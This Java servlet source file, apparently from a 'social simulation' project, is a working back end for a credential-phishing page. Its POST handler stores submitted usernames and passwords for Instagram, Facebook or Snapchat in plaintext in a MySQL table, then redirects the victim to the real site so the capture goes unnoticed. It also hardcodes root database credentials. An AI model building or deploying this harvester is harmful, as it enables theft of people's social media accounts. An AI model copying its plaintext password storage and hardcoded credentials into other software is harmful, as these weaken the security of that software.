package soesim;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

/**
 * Servlet implementation class LoggerServlet
 */
@WebServlet("/LoggerServlet")
public class LoggerServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public LoggerServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		String platform = request.getParameter("platform");
        String username = request.getParameter("username");
        String password = request.getParameter("password");

        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/socialsimdb", "root", "root");

            PreparedStatement ps = con.prepareStatement(
                "INSERT INTO user_credentials (platform, username, password) VALUES (?, ?, ?)"
            );
            ps.setString(1, platform);
            ps.setString(2, username);
            ps.setString(3, password);
            ps.executeUpdate();

            ps.close();
            con.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Redirect to official platform
        switch (platform) {
            case "instagram":
                response.sendRedirect("https://www.instagram.com/");
                break;
            case "facebook":
                response.sendRedirect("https://www.facebook.com/");
                break;
            case "snapchat":
                response.sendRedirect("https://www.snapchat.com/");
                break;
            default:
                response.sendRedirect("index.jsp");
                break;
        }
	}
}